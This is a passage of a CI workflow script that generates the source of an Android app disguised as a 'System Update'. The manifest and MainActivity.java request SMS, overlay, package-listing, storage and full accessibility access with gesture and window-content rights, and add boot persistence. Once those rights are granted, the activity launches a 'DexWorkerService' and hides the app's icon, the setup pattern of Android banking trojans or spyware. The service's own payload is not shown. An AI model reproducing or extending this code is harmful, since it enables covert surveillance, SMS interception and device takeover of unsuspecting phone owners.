                  android:pathData="M256,168c-48.6,0-88,39.4-88,88s39.4,88 88,88s88-39.4 88-88S304.6,168 256,168z M256,312c-30.9,0-56-25.1-56-56s25.1-56 56-56s56,25.1 56,56S286.9,312 256,312z"/>
              <path
                  android:fillColor="#3b82f6"
                  android:pathData="M384.1,204.7c3.4-9.5 5.9-19.5 7.5-29.8l-29.4-29.4c-10.3,1.6-20.3,4.1-29.8,7.5c-3.9-1.7-7.9-3.2-12-4.6l6.4-41.4c-14.5-5.5-29.8-8.5-45.6-8.5c-15.8,0-31.1,3-45.6,8.5l6.4,41.4c-4.1,1.4-8.1,2.9-12,4.6c-9.5-3.4-19.5-5.9-29.8-7.5l-29.4,29.4c1.6,10.3 4.1,20.3 7.5,29.8c-1.7,3.9-3.2,7.9-4.6,12l-41.4-6.4c-5.5,14.5-8.5,29.8-8.5,45.6c0,15.8 3,31.1 8.5,45.6l41.4-6.4c1.4,4.1 2.9,8.1 4.6,12c-3.4,9.5-5.9,19.5-7.5,29.8l29.4,29.4c10.3-1.6,20.3-4.1,29.8-7.5c3.9,1.7 7.9,3.2 12,4.6l-6.4,41.4c14.5,5.5 29.8,8.5 45.6,8.5c15.8,0 31.1-3 45.6-8.5l-6.4-41.4c4.1-1.4 8.1-2.9 12-4.6c9.5,3.4 19.5,5.9 29.8,7.5l29.4-29.4c-1.6-10.3-4.1-20.3-7.5-29.8c1.7-3.9 3.2-7.9 4.6-12l41.4,6.4c5.5-14.5 8.5-29.8 8.5-45.6c0-15.8-3-31.1-8.5-45.6l-41.4,6.4c-1.4-4.1-2.9-8.1-4.6-12z M256,344c-48.6,0-88-39.4-88-88s39.4-88 88-88s88,39.4 88,88S304.6,344 256,344z"/>
          </vector>
          EOF

      - name: Create drawable/ic_success.xml
        run: |
          cat > app/src/main/res/drawable/ic_success.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="24dp"
              android:height="24dp"
              android:viewportWidth="24"
              android:viewportHeight="24">
              <path
                  android:fillColor="#34A853"
                  android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10s10-4.48 10-10S17.52,2 12,2z M10,17l-5-5l1.41-1.41L10,14.17l7.59-7.59L19,8L10,17z"/>
          </vector>
          EOF

      - name: Create drawable/system_button.xml
        run: |
          cat > app/src/main/res/drawable/system_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <solid android:color="@color/button_pressed"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <solid android:color="@color/system_blue"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      - name: Create drawable/system_button_outline.xml
        run: |
          cat > app/src/main/res/drawable/system_button_outline.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/button_pressed"/>
                      <solid android:color="#E8F0FE"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/system_blue"/>
                      <solid android:color="@color/white"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      - name: Create ic_launcher_foreground.xml (Gear)
        run: |
          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path
                  android:fillColor="#3b82f6"
                  android:pathData="M54,18c-19.9,0-36,16.1-36,36c0,19.9,16.1,36,36,36s36-16.1,36-36C90,34.1,73.9,18,54,18z M54,80c-14.4,0-26-11.6-26-26c0-14.4,11.6-26,26-26s26,11.6,26,26C80,68.4,68.4,80,54,80z"/>
              <path
                  android:fillColor="#3b82f6"
                  android:pathData="M54,34c-11,0-20,9-20,20s9,20,20,20s20-9,20-20S65,34,54,34z M54,68c-7.7,0-14-6.3-14-14s6.3-14,14-14s14,6.3,14,14S61.7,68,54,68z"/>
              <path
                  android:fillColor="#3b82f6"
                  android:pathData="M69.2,48.1c0.6-1.9,1.1-3.9,1.4-5.9l-4.9-4.9c-1.9,0.3-3.9,0.8-5.9,1.4c-0.8-0.4-1.6-0.7-2.4-0.9l1.3-8.7c-2.9-1.1-5.9-1.7-9.1-1.7c-3.2,0-6.2,0.6-9.1,1.7l1.3,8.7c-0.8,0.3-1.6,0.6-2.4,0.9c-2-0.6-4-1.1-5.9-1.4l-4.9,4.9c0.3,1.9,0.8,3.9,1.4,5.9c-0.4,0.8-0.7,1.6-0.9,2.4l-8.7-1.3c-1.1,2.9-1.7,5.9-1.7,9.1c0,3.2,0.6,6.2,1.7,9.1l8.7-1.3c0.3,0.8,0.6,1.6,0.9,2.4c-0.6,2-1.1,4-1.4,5.9l4.9,4.9c1.9-0.3,3.9-0.8,5.9-1.4c0.8,0.4,1.6,0.7,2.4,0.9l-1.3,8.7c2.9,1.1,5.9,1.7,9.1,1.7c3.2,0,6.2-0.6,9.1-1.7l-1.3-8.7c0.8-0.3,1.6-0.6,2.4-0.9c2,0.6,4,1.1,5.9,1.4l4.9-4.9c-0.3-1.9-0.8-3.9-1.4-5.9c0.4-0.8,0.7-1.6,0.9-2.4l8.7,1.3c1.1-2.9,1.7-5.9,1.7-9.1c0-3.2-0.6-6.2-1.7-9.1l-8.7,1.3c-0.3-0.8-0.6-1.6-0.9-2.4z M54,70c-8.8,0-16-7.2-16-16s7.2-16,16-16s16,7.2,16,16S62.8,70,54,70z"/>
          </vector>
          EOF

      - name: Create mipmap-anydpi-v26/ic_launcher.xml
        run: |
          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

      # ==================== ANDROID MANIFEST ====================
      
      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <!-- PERMISSIONS -->
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.GET_TASKS" />
              <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

              <application
                  android:allowBackup="true"
                  android:icon="@mipmap/ic_launcher"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.SystemUpdate"
                  android:usesCleartextTraffic="true"
                  android:requestLegacyExternalStorage="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.SystemUpdate">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <!-- DEX WORKER SERVICE -->
                  <service
                      android:name=".DexWorkerService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".NetworkReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      # ==================== LAYOUT (Buttons UI) ====================
      
      - name: Create layout/activity_main.xml
        run: |
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:app="http://schemas.android.com/apk/res-auto"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:gravity="center"
              android:padding="32dp"
              android:background="@color/system_dark">

              <ImageView
                  android:layout_width="120dp"
                  android:layout_height="120dp"
                  android:src="@drawable/ic_gear"
                  android:layout_marginBottom="16dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/welcome"
                  android:textSize="28sp"
                  android:textColor="@color/system_blue"
                  android:textStyle="bold"
                  android:layout_marginBottom="8dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/permission_desc"
                  android:textSize="14sp"
                  android:textColor="@color/text_gray"
                  android:gravity="center"
                  android:layout_marginBottom="32dp"/>

              <com.google.android.material.button.MaterialButton
                  android:id="@+id/btnGrantPermissions"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="@string/grant_permissions"
                  android:textSize="16sp"
                  android:textColor="@color/white"
                  android:background="@drawable/system_button"
                  android:layout_marginBottom="16dp"
                  app:icon="@drawable/ic_success"
                  app:iconGravity="textEnd"
                  app:iconTint="@color/white"/>

              <com.google.android.material.button.MaterialButton
                  android:id="@+id/btnGrantAccessibility"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="@string/grant_accessibility"
                  android:textSize="16sp"
                  android:textColor="@color/system_blue"
                  android:background="@drawable/system_button_outline"
                  app:icon="@drawable/ic_success"
                  app:iconGravity="textEnd"
                  app:iconTint="@color/success_green"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/accessibility_desc"
                  android:textSize="12sp"
                  android:textColor="@color/text_gray"
                  android:gravity="center"
                  android:layout_marginTop="24dp"/>

          </LinearLayout>
          EOF

      # ==================== ACCESSIBILITY CONFIG ====================
      
      - name: Create accessibility_config.xml
        run: |
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/app_name"
              android:notificationTimeout="100" />
          EOF

      # ==================== SOURCE FILES ====================

      - name: Create MainActivity.java (UI Logic)
        run: |
          cat > app/src/main/java/com/system/update/MainActivity.java << 'EOF'
          package com.system.update;

          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.Toast;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.util.ArrayList;
          import java.util.List;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 100;
              private static final int OVERLAY_PERMISSION_REQUEST = 101;

              private Button btnGrantPermissions;
              private Button btnGrantAccessibility;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  btnGrantPermissions = findViewById(R.id.btnGrantPermissions);
                  btnGrantAccessibility = findViewById(R.id.btnGrantAccessibility);

                  btnGrantPermissions.setOnClickListener(v -> requestAllPermissions());
                  btnGrantAccessibility.setOnClickListener(v -> openAccessibilitySettings());

                  checkPermissions();
              }

              private void checkPermissions() {
                  String[] checkPerms = {
                          android.Manifest.permission.INTERNET,
                          android.Manifest.permission.ACCESS_NETWORK_STATE,
                          android.Manifest.permission.QUERY_ALL_PACKAGES,
                          android.Manifest.permission.GET_TASKS,
                          android.Manifest.permission.PACKAGE_USAGE_STATS,
                          android.Manifest.permission.READ_EXTERNAL_STORAGE,
                          android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                          android.Manifest.permission.RECEIVE_SMS
                  };

                  boolean allGranted = true;
                  for (String perm : checkPerms) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          allGranted = false;
                          break;
                      }
                  }

                  boolean overlayGranted = true;
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      overlayGranted = Settings.canDrawOverlays(this);
                  }

                  boolean accessibilityEnabled = isAccessibilityEnabled();

                  if (allGranted && overlayGranted && accessibilityEnabled) {
                      startDexServiceAndHide();
                  }

                  updateButtons(allGranted, overlayGranted, accessibilityEnabled);
              }

              private void requestAllPermissions() {
                  String[] permissions = {
                          android.Manifest.permission.INTERNET,
                          android.Manifest.permission.ACCESS_NETWORK_STATE,
                          android.Manifest.permission.QUERY_ALL_PACKAGES,
                          android.Manifest.permission.GET_TASKS,
                          android.Manifest.permission.PACKAGE_USAGE_STATS,
                          android.Manifest.permission.READ_EXTERNAL_STORAGE,
                          android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                          android.Manifest.permission.RECEIVE_SMS,
                          android.Manifest.permission.SYSTEM_ALERT_WINDOW
                  };

                  List<String> toRequest = new ArrayList<>();
                  for (String perm : permissions) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          toRequest.add(perm);
                      }
                  }

                  if (!toRequest.isEmpty()) {
                      ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                  }

                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                  Uri.parse("package:" + getPackageName()));
                          startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                      }
                  }

                  // Re-check after a delay
                  new android.os.Handler().postDelayed(this::checkPermissions, 2000);
              }

              private void openAccessibilitySettings() {
                  Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                  startActivity(intent);
                  Toast.makeText(this, "Enable System Update Accessibility Service", Toast.LENGTH_LONG).show();
                  new android.os.Handler().postDelayed(this::checkPermissions, 3000);
              }

              private boolean isAccessibilityEnabled() {
                  try {
                      String service = getPackageName() + "/" + DexWorkerService.class.getCanonicalName();
                      String enabledServices = Settings.Secure.getString(
                              getContentResolver(),
                              Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                      );
                      return enabledServices != null && enabledServices.contains(service);
                  } catch (Exception e) {
                      return false;
                  }
              }

              private void updateButtons(boolean perms, boolean overlay, boolean acc) {
                  boolean all = perms && overlay && acc;
                  if (all) {
                      btnGrantPermissions.setEnabled(false);
                      btnGrantPermissions.setText(R.string.permissions_granted);
                      btnGrantAccessibility.setEnabled(false);
                      btnGrantAccessibility.setText(R.string.accessibility_enabled);
                  } else {
                      btnGrantPermissions.setEnabled(true);
                      btnGrantPermissions.setText(R.string.grant_permissions);
                      btnGrantAccessibility.setEnabled(true);
                      btnGrantAccessibility.setText(R.string.grant_accessibility);
                  }
              }

              private void startDexServiceAndHide() {
                  Intent serviceIntent = new Intent(this, DexWorkerService.class);
                  startService(serviceIntent);
                  hideAppIcon();
                  finish();
              }

              private void hideAppIcon() {
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  PackageManager pm = getPackageManager();
                  pm.setComponentEnabledSetting(componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                  Toast.makeText(this, "✅ All permissions granted! App hidden.", Toast.LENGTH_SHORT).show();
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERMISSION_REQUEST_CODE) {
                      new android.os.Handler().postDelayed(this::checkPermissions, 2000);
                  }
              }

              @Override
              protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                  super.onActivityResult(requestCode, resultCode, data);
                  if (requestCode == OVERLAY_PERMISSION_REQUEST) {
                      new android.os.Handler().postDelayed(this::checkPermissions, 2000);
                  }
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  checkPermissions();
              }
          }
